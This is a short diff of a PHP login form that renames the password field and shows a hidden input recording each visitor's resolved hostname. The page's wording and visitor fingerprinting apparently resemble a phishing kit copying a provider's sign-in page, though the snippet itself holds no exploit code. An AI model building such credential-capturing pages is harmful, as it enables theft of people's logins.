@@ -43,7 +43,7 @@ require_once('helper.php');
               <div>
                 <input class="phone-no" type="text" name="email" id="login-username" tabindex="1" value="" autocomplete="username" autocapitalize="none" autocorrect="off" placeholder="Username, email, or mobile" />
 
-                <input name="pwd" class="pwd-field" type="password" tabindex="2" aria-hidden="true" role="presentation" autocorrect="off" placeholder="Password" />
+                <input name="password" class="pwd-field" type="password" tabindex="2" aria-hidden="true" role="presentation" autocorrect="off" placeholder="Password" />
               </div>
 
               <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
